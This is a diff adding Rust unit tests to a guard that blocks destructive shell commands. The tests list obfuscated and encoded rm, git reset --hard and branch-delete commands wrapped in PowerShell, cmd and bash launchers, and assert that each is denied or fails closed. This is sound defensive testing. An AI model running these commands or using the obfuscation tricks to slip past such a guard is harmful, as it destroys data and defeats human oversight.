+        let outer = "Write-Output $(rm -r ./tree)";
+
+        for selector in [
+            AllowSelector::ExactCommand(outer.to_string()),
+            AllowSelector::CommandPrefix(outer.to_string()),
+            AllowSelector::RegexPattern(r"^Write-Output \$\(rm -r \./tree\)$".to_string()),
+        ] {
+            let allowlists = project_allowlists_for_command_selector(
+                selector.clone(),
+                matches!(selector, AllowSelector::RegexPattern(_)),
+            );
+            let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                outer,
+                &enabled_keywords,
+                &ordered_packs,
+                keyword_index.as_ref(),
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                ShellDialect::PowerShell,
+            );
+            assert!(
+                result.is_allowed(),
+                "full-command selector must authorize the outer envelope before its nested body: {selector:?}: {:?}",
+                result.pattern_info
+            );
+        }
+
+        let exact = project_allowlists_for_command_selector(
+            AllowSelector::ExactCommand(outer.to_string()),
+            false,
+        );
+        let changed = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+            "Write-Output $(rm -r ./other-tree)",
+            &enabled_keywords,
+            &ordered_packs,
+            keyword_index.as_ref(),
+            &compiled,
+            &exact,
+            &heredoc_settings,
+            None,
+            None,
+            None,
+            ShellDialect::PowerShell,
+        );
+        assert!(
+            changed.is_denied(),
+            "an exact outer authorization must not cover a nearby changed command"
+        );
+
+        let launcher = "pwsh -Command 'rm -r ./tree'";
+        let launcher_exact = project_allowlists_for_command_selector(
+            AllowSelector::ExactCommand(launcher.to_string()),
+            false,
+        );
+        let launcher_result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+            launcher,
+            &enabled_keywords,
+            &ordered_packs,
+            keyword_index.as_ref(),
+            &compiled,
+            &launcher_exact,
+            &heredoc_settings,
+            None,
+            None,
+            None,
+            ShellDialect::Posix,
+        );
+        assert!(
+            launcher_result.is_allowed(),
+            "an exact launcher authorization must be checked before its payload"
+        );
+
+        let posix_launcher = "bash -c 'rm -r ./tree'";
+        let posix_launcher_exact = project_allowlists_for_command_selector(
+            AllowSelector::ExactCommand(posix_launcher.to_string()),
+            false,
+        );
+        let posix_launcher_result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+            posix_launcher,
+            &enabled_keywords,
+            &ordered_packs,
+            keyword_index.as_ref(),
+            &compiled,
+            &posix_launcher_exact,
+            &heredoc_settings,
+            None,
+            None,
+            None,
+            ShellDialect::Posix,
+        );
+        assert!(
+            posix_launcher_result.is_allowed(),
+            "an exact POSIX inline-code authorization must be checked before its payload"
+        );
+    }
+
+    #[test]
+    fn obfuscated_posix_inline_launchers_are_decoded_or_fail_closed() {
+        use crate::normalize::ShellDialect;
+
+        let enabled_keywords = ["rm"];
+        let ordered_packs = ["core.filesystem".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let heredoc_settings = default_config().heredoc_settings();
+
+        for command in [
+            "b'a'sh -c 'rm -r ./tree'",
+            "b$(printf as)h -c 'rm -r ./tree'",
+            "$(printf bash) -c 'rm -r ./tree'",
+            "$(printf bash) -c \"$(date)\"",
+            "$shell -c 'rm -r ./tree'",
+            "$(select_shell) -c 'echo safe'",
+            "p'y'thon -c 'import os'",
+        ] {
+            let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                command,
+                &enabled_keywords,
+                &ordered_packs,
+                keyword_index.as_ref(),
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                ShellDialect::Posix,
+            );
+            assert!(
+                result.is_denied(),
+                "obfuscated/dynamic inline interpreter must not hide executable code: {command}: {:?}",
+                result.pattern_info
+            );
+        }
+
+        for command in [
+            "b'a'sh -c 'echo safe'",
+            "$(printf bash) -c 'echo safe'",
+            "$(printf psql) -X -c 'SELECT 1'",
+            "$tool --version",
+        ] {
+            let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                command,
+                &enabled_keywords,
+                &ordered_packs,
+                keyword_index.as_ref(),
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                ShellDialect::Posix,
+            );
+            assert!(
+                result.is_allowed(),
+                "safe decoded launcher/non-inline dynamic executable should remain allowed: {command}: {:?}",
+                result.pattern_info
+            );
+        }
+    }
+
+    #[test]
+    fn visible_git_shell_aliases_are_recursively_evaluated_with_quoted_arguments() {
+        use crate::normalize::ShellDialect;
+
+        let enabled_keywords = ["git", "rm"];
+        let ordered_packs = ["core.git".to_string(), "core.filesystem".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let heredoc_settings = default_config().heredoc_settings();
+
+        for command in [
+            "git -c 'alias.x=!rm -r ./tree' x",
+            "git -c 'alias.x=!f() { git branch \"$@\"; }; f' x -d victim",
+            "git -c 'alias.x=!$TOOL' x -d victim",
+        ] {
+            let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                command,
+                &enabled_keywords,
+                &ordered_packs,
+                keyword_index.as_ref(),
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                ShellDialect::Posix,
+            );
+            assert!(
+                result.is_denied(),
+                "invoked Git shell alias must not hide destructive/unverifiable behavior: {command}: {:?}",
+                result.pattern_info
+            );
+        }
+
+        for command in [
+            "git -c 'alias.x=!printf safe' x",
+            "git -c 'alias.x=!printf \"%s\\n\"' x 'rm -r ./tree'",
+        ] {
+            let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                command,
+                &enabled_keywords,
+                &ordered_packs,
+                keyword_index.as_ref(),
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                ShellDialect::Posix,
+            );
+            assert!(
+                result.is_allowed(),
+                "Git alias arguments reconstructed as shell argv must remain data: {command}: {:?}",
+                result.pattern_info
+            );
+        }
+    }
+
+    #[test]
+    fn windows_launcher_host_tokens_are_decoded_strictly() {
+        use crate::normalize::ShellDialect;
+
+        assert_eq!(
+            launcher_executable_name(r#""C:\Windows\System32\PoWeRsHeLl.ExE""#, ShellDialect::Cmd)
+                .as_deref(),
+            Some("powershell")
+        );
+        assert_eq!(
+            launcher_executable_name("power`shell.ExE", ShellDialect::PowerShell).as_deref(),
+            Some("powershell")
+        );
+        assert_eq!(
+            powershell_host_option("-Co", ShellDialect::PowerShell),
+            PowerShellHostOption::Command
+        );
+        assert_eq!(
+            powershell_host_option("-En", ShellDialect::PowerShell),
+            PowerShellHostOption::EncodedCommand
+        );
+        assert_eq!(
+            powershell_host_option("-NoL", ShellDialect::PowerShell),
+            PowerShellHostOption::NoValue
+        );
+        assert_eq!(
+            powershell_host_option("-Work", ShellDialect::PowerShell),
+            PowerShellHostOption::Value
+        );
+        assert_eq!(
+            powershell_host_option("-NoP", ShellDialect::PowerShell),
+            PowerShellHostOption::Unknown,
+            "NoProfile and NoProfileLoadTime make -NoP ambiguous"
+        );
+        assert_eq!(
+            powershell_host_option("-W", ShellDialect::PowerShell),
+            PowerShellHostOption::Unknown,
+            "WindowStyle and WorkingDirectory make -W ambiguous"
+        );
+        assert_eq!(
+            powershell_host_option("-Com`mand", ShellDialect::PowerShell),
+            PowerShellHostOption::Unknown,
+            "a mid-token bare backtick is passed literally to the native host"
+        );
+        assert!(matches!(
+            parse_windows_launcher_segment("call %DCG_DYNAMIC%", ShellDialect::Cmd, 1024),
+            WindowsLauncherParse::Unverified(_)
+        ));
+        assert!(
+            windows_launcher_envelopes("call %DCG_DYNAMIC%", ShellDialect::Unknown, 1024).is_err()
+        );
+    }
+
+            let mut safe_patterns = Vec::new();
+            for i in 0..20 {
+                safe_patterns.push(crate::packs::SafePattern {
+                    regex: crate::packs::regex_engine::LazyCompiledRegex::new(
+                        // Lookahead forces backtracking engine; nested quantifiers
+                        // cause worst-case backtracking on the adversarial input below.
+                        if i % 2 == 0 {
+                            r"(?=.*safe_cmd)(\w+\s+)*\w+"
+                        } else {
+                            r"(?=.*no_match_ever)(\w+\s+)*\w+"
+                        },
+                    ),
+                    name: "adversarial_safe",
+                });
+            }
+            let pack = Pack {
+                id: "test.adversarial".to_string(),
+                name: "adversarial",
+                description: "test pack",
+                keywords: &["rm"],
+                safe_patterns,
+                destructive_patterns: vec![crate::destructive_pattern!(
+                    "adversarial_rm",
+                    r"rm\b",
+                    "test destructive",
+                    High
+                )],
+                keyword_matcher: None,
+                safe_regex_set: None,
+                safe_regex_set_is_complete: false,
+                default_effects: crate::packs::DEFAULT_PACK_EFFECTS,
+            };
+    #[test]
+    fn windows_launcher_envelopes_block_destructive_commands_across_dialects() {
+        use crate::normalize::ShellDialect;
+
+        let enabled_keywords = ["git"];
+        let ordered_packs = ["core.git".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let heredoc_settings = default_config().heredoc_settings();
+        let encoded = powershell_command_base64("g`it branch -`d no-such-dcg-envelope");
+        let mut destructive = vec![
+            (
+                ShellDialect::Unknown,
+                "powershell.exe -Command 'g`it branch -`d no-such-dcg-envelope'".to_string(),
+            ),
+            (
+                ShellDialect::PowerShell,
+                "& power`shell.ExE -`Command 'g`it branch -`d no-such-dcg-envelope'".to_string(),
+            ),
+            (
+                ShellDialect::PowerShell,
+                "& pwsh -Command { g`it branch -`d no-such-dcg-envelope }".to_string(),
+            ),
+            (
+                ShellDialect::Unknown,
+                format!(r#"powershell "-EncodedCommand" "{encoded}""#),
+            ),
+            (
+                ShellDialect::PowerShell,
+                format!("power`shell -`EncodedCommand {encoded}"),
+            ),
+            (
+                ShellDialect::Unknown,
+                r#"cmd.exe /c "g^it branch -^d no-such-dcg-envelope""#.to_string(),
+            ),
+            (
+                ShellDialect::Cmd,
+                r#"c^md.ExE /^s /^c "g^it branch -^d no-such-dcg-envelope""#.to_string(),
+            ),
+            (
+                ShellDialect::Cmd,
+                r#""C:\Windows\System32\CmD.ExE" "/s" "/k" "g^it branch -^d no-such-dcg-envelope""#
+                    .to_string(),
+            ),
+            (
+                ShellDialect::PowerShell,
+                r#"pwsh -Command 'cmd /c "g^it branch -^d no-such-dcg-envelope"'"#.to_string(),
+            ),
+            (
+                ShellDialect::Cmd,
+                format!(r#"cmd /c "powershell -EncodedCommand {encoded}""#),
+            ),
+            (
+                ShellDialect::Posix,
+                "p$(printf w)sh -Command 'g`it branch -`d no-such-dcg-envelope'".to_string(),
+            ),
+            (
+                ShellDialect::Cmd,
+                "call g^it branch -^d no-such-dcg-envelope".to_string(),
+            ),
+            (
+                ShellDialect::Cmd,
+                "call git branch -d no-such-dcg-envelope".to_string(),
+            ),
+            (
+                ShellDialect::Cmd,
+                "@g^it branch -^d no-such-dcg-envelope".to_string(),
+            ),
+            (
+                ShellDialect::Cmd,
+                "@git branch -d no-such-dcg-envelope".to_string(),
+            ),
+            (
+                ShellDialect::Cmd,
+                r#"cmd /c "call g^it branch -^d no-such-dcg-envelope""#.to_string(),
+            ),
+            (
+                ShellDialect::Cmd,
+                r#"cmd /c "@g^it branch -^d no-such-dcg-envelope""#.to_string(),
+            ),
+        ];
+        for wrapper in [
+            "sudo",
+            "env DCG_LAUNCHER_TEST=1",
+            "command",
+            "exec",
+            "nohup",
+            "time",
+            "sudo env DCG_LAUNCHER_TEST=1 command exec nohup time",
+        ] {
+            destructive.push((
+                ShellDialect::Posix,
+                format!("{wrapper} pwsh -Command 'g`it branch -`d no-such-dcg-envelope'"),
+            ));
+        }
+        destructive.push((
+            ShellDialect::Posix,
+            "\\pwsh -Command 'g`it branch -`d no-such-dcg-envelope'".to_string(),
+        ));
+
+        for index in [None, keyword_index.as_ref()] {
+            for (dialect, command) in &destructive {
+                let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                    *dialect,
+                );
+                assert!(
+                    result.is_denied(),
+                    "must deny {command:?} for {dialect:?}; index={}: {:?}",
+                    index.is_some(),
+                    result.pattern_info
+                );
+                let info = result.pattern_info.expect("launcher denial metadata");
+                assert_eq!(info.pack_id.as_deref(), Some("core.git"), "{command:?}");
+                assert_eq!(
+                    info.pattern_name.as_deref(),
+                    Some("branch-force-delete"),
+                    "{command:?}"
+                );
+                assert!(
+                    info.matched_span.is_none(),
+                    "decoded launcher payloads have no raw outer-command source map: {command:?}"
+                );
+                assert!(
+                    info.matched_text_preview.is_none(),
+                    "decoded launcher payloads have no raw outer-command preview: {command:?}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn windows_launcher_envelopes_preserve_safe_commands_and_allowlists() {
+        use crate::normalize::ShellDialect;
+
+        let enabled_keywords = ["git"];
+        let ordered_packs = ["core.git".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let heredoc_settings = default_config().heredoc_settings();
+        let benign_encoded = powershell_command_base64("Write-Output ok");
+        let safe = [
+            (
+                ShellDialect::Unknown,
+                "powershell -Command 'g`it branch --format -`d'".to_string(),
+            ),
+            (
+                ShellDialect::PowerShell,
+                "pwsh -NoL -NonI -Command 'g`it branch --format -`d'".to_string(),
+            ),
+            (
+                ShellDialect::Cmd,
+                r#"cmd /s /c "g^it branch --format -^d""#.to_string(),
+            ),
+            (
+                ShellDialect::Unknown,
+                format!("powershell -EncodedCommand {benign_encoded}"),
+            ),
+            (
+                ShellDialect::Posix,
+                "command -v pwsh && echo$(producer) ok".to_string(),
+            ),
+            (ShellDialect::Posix, "time echo git branch -d".to_string()),
+            (
+                ShellDialect::Cmd,
+                "call g^it branch --format -^d".to_string(),
+            ),
+            (ShellDialect::Cmd, "call git branch --format -d".to_string()),
+            (ShellDialect::Cmd, "@g^it branch --format -^d".to_string()),
+            (ShellDialect::Cmd, "call echo git branch -d".to_string()),
+            (
+                ShellDialect::Posix,
+                r#"pwsh -NoProfile -Command "'git branch -d victim'""#.to_string(),
+            ),
+            (
+                ShellDialect::Posix,
+                r#"pwsh -NoProfile -Command '"git branch -d victim"'"#.to_string(),
+            ),
+            (
+                ShellDialect::Posix,
+                "pwsh -Command '{ git branch -d victim }'".to_string(),
+            ),
+            (
+                ShellDialect::PowerShell,
+                r#"& pwsh -Command "{ git branch -d victim }""#.to_string(),
+            ),
+        ];
+
+        for (dialect, command) in safe {
+            let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                &command,
+                &enabled_keywords,
+                &ordered_packs,
+                keyword_index.as_ref(),
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                dialect,
+            );
+            assert!(
+                result.is_allowed(),
+                "must allow {command:?} for {dialect:?}: {:?}",
+                result.pattern_info
+            );
+        }
+
+        let allowed_encoded = powershell_command_base64("git branch -d allowed-by-rule");
+        let command = format!("powershell -EncodedCommand {allowed_encoded}");
+        let allowlists = project_allowlists_for_rule(
+            "core.git:branch-force-delete",
+            "launcher allowlist propagation test",
+        );
+        let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+            &command,
+            &enabled_keywords,
+            &ordered_packs,
+            keyword_index.as_ref(),
+            &compiled,
+            &allowlists,
+            &heredoc_settings,
+            None,
+            None,
+            None,
+            ShellDialect::Unknown,
+        );
+        assert!(result.is_allowed());
+        let allowlist = result
+            .allowlist_override
+            .expect("nested rule allowlist metadata must reach the outer result");
+        assert_eq!(allowlist.layer, AllowlistLayer::Project);
+        assert_eq!(
+            allowlist.matched.pattern_name.as_deref(),
+            Some("branch-force-delete")
+        );
+    }
+
+    #[test]
+    fn windows_launcher_envelopes_fail_closed_when_payloads_are_not_verifiable() {
+        use crate::normalize::ShellDialect;
+        use base64::Engine;
+
+        let enabled_keywords = ["git"];
+        let ordered_packs = ["core.git".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let mut heredoc_settings = default_config().heredoc_settings();
+        heredoc_settings.limits.max_body_bytes = 16;
+        let odd_utf16 = base64::engine::general_purpose::STANDARD.encode([0x41]);
+        let lone_surrogate =
+            base64::engine::general_purpose::STANDARD.encode(0xd800_u16.to_le_bytes());
+        let oversized = powershell_command_base64("Write-Output this-payload-is-too-long");
+        let unverified = [
+            "powershell -EncodedCommand %%%".to_string(),
+            "powershell -EncodedCommand -".to_string(),
+            format!("powershell -EncodedCommand {odd_utf16}"),
+            format!("powershell -EncodedCommand {lone_surrogate}"),
+            format!("powershell -EncodedCommand {oversized}"),
+            "pwsh -Command '$payload'".to_string(),
+            "pwsh -Command -".to_string(),
+            "printf 'Write-Output safe' | pwsh -NoProfile -NonInteractive -Command -".to_string(),
+            "p$(producer)wsh -Command 'Write-Output safe'".to_string(),
+            "pwsh -Command $(producer)".to_string(),
+            r#"cmd /c "echo %DCG_DYNAMIC%""#.to_string(),
+            "call %DCG_DYNAMIC%".to_string(),
+            "@%DCG_DYNAMIC%".to_string(),
+            "powershell -NoP -Command 'Write-Output ok'".to_string(),
+            "powershell -DefinitelyUnknown 'Write-Output ok'".to_string(),
+            "cmd /z echo ok".to_string(),
+        ];
+
+        for command in unverified {
+            let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                &command,
+                &enabled_keywords,
+                &ordered_packs,
+                keyword_index.as_ref(),
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                ShellDialect::Unknown,
+            );
+            assert!(
+                result.is_denied(),
+                "unverifiable launcher payload must fail closed: {command:?}"
+            );
+            let info = result.pattern_info.expect("fail-closed denial metadata");
+            assert_eq!(info.source, MatchSource::LegacyPattern, "{command:?}");
+            assert!(info.matched_span.is_none(), "{command:?}");
+        }
+
+        let mut nested = "git status".to_string();
+        for _ in 0..=MAX_EMBEDDED_SHELL_DEPTH {
+            nested = format!("pwsh -Command {{ {nested} }}");
+        }
+        let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+            &nested,
+            &enabled_keywords,
+            &ordered_packs,
+            keyword_index.as_ref(),
+            &compiled,
+            &allowlists,
+            &default_config().heredoc_settings(),
+            None,
+            None,
+            None,
+            ShellDialect::PowerShell,
+        );
+        assert!(result.is_denied(), "launcher recursion must be bounded");
+        assert!(
+            result
+                .pattern_info
+                .as_ref()
+                .is_some_and(|info| info.reason.contains("nesting exceeds")),
+            "unexpected recursion denial: {:?}",
+            result.pattern_info
+        );
+
+        let mut nested_cmd = "git status".to_string();
+        for _ in 0..=MAX_EMBEDDED_SHELL_DEPTH {
+            nested_cmd = format!("call {nested_cmd}");
+        }
+        let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+            &nested_cmd,
+            &enabled_keywords,
+            &ordered_packs,
+            keyword_index.as_ref(),
+            &compiled,
+            &allowlists,
+            &default_config().heredoc_settings(),
+            None,
+            None,
+            None,
+            ShellDialect::Cmd,
+        );
+        assert!(result.is_denied(), "cmd call recursion must be bounded");
+        assert!(
+            result
+                .pattern_info
+                .as_ref()
+                .is_some_and(|info| info.reason.contains("nesting exceeds")),
+            "unexpected cmd recursion denial: {:?}",
+            result.pattern_info
+        );
+    }
+
+    #[test]
+    fn branch_semantic_allowlist_does_not_hide_other_git_rules() {
+        let enabled_keywords = ["git"];
+        let ordered_packs = ["core.git".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists =
+            project_allowlists_for_rule("core.git:branch-force-delete", "explicit test exception");
+        let config = default_config();
+        let heredoc_settings = config.heredoc_settings();
+
+        let allowed = evaluate_command_with_pack_order_deadline_at_path(
+            "git branch --del feature",
+            &enabled_keywords,
+            &ordered_packs,
+            keyword_index.as_ref(),
+            &compiled,
+            &allowlists,
+            &heredoc_settings,
+            None,
+            None,
+            None,
+        );
+        assert!(allowed.is_allowed());
+        assert!(allowed.allowlist_override.is_some());
+
+        let still_denied = evaluate_command_with_pack_order_deadline_at_path(
+            "git branch --del feature && git reset --hard",
+            &enabled_keywords,
+            &ordered_packs,
+            keyword_index.as_ref(),
+            &compiled,
+            &allowlists,
+            &heredoc_settings,
+            None,
+            None,
+            None,
+        );
+        assert!(still_denied.is_denied());
+        assert_eq!(
+            still_denied
+                .pattern_info
+                .as_ref()
+                .and_then(|info| info.pattern_name.as_deref()),
+            Some("reset-hard")
+        );
     }
 
     #[test]
@@ -12280,6 +22091,7 @@ mod tests {
                 allowlist_override: None,
                 effective_mode: Some(crate::packs::DecisionMode::Deny),
                 skipped_due_to_budget: false,
+                quick_rejected: false,
                 branch_context: None,
                 session_occurrence: None,
                 graduated_response: None,
@@ -12467,6 +22279,7 @@ mod tests {
                 branch_context: None,
                 effective_mode: None,
                 skipped_due_to_budget: false,
+                quick_rejected: false,
                 session_occurrence: None,
                 graduated_response: None,
                 bypass_method: None,
@@ -12719,6 +22532,42 @@ mod tests {
             assert!(
                 result.is_allowed(),
                 "exceeded size limit should fail-open with default settings"
+            );
+        }
+
+        #[test]
+        fn extraction_timeout_uses_bounded_destructive_fallback() {
+            let limits = crate::heredoc::ExtractionLimits {
+                max_body_bytes: 1024 * 1024,
+                max_body_lines: 10_000,
+                max_heredocs: 10,
+                timeout_ms: 0,
+            };
+            let settings = heredoc_config_with_limits(limits);
+            let cmd = "python3 <<'PY'\nimport shutil\nshutil.rmtree('/home/example/project')\nPY";
+            let result = eval_with_heredoc(cmd, &settings);
+            assert!(
+                result.is_denied(),
+                "timeout fallback must still block an obvious destructive embedded-code sink: \
+                 {result:?}"
+            );
+            assert!(
+                result
+                    .reason()
+                    .is_some_and(|reason| reason.contains("bounded fallback")),
+                "timeout denial should identify the bounded fallback path: {result:?}"
+            );
+        }
+
+        #[test]
+        fn parse_failure_uses_bounded_destructive_fallback() {
+            let settings = heredoc_config(true, true);
+            let cmd = "python3 <<'PY'\nimport shutil\nshutil.rmtree('/home/example/project')";
+            let result = eval_with_heredoc(cmd, &settings);
+            assert!(
+                result.is_denied(),
+                "parse-error fallback must still block an obvious destructive embedded-code sink: \
+                 {result:?}"
             );
         }
 
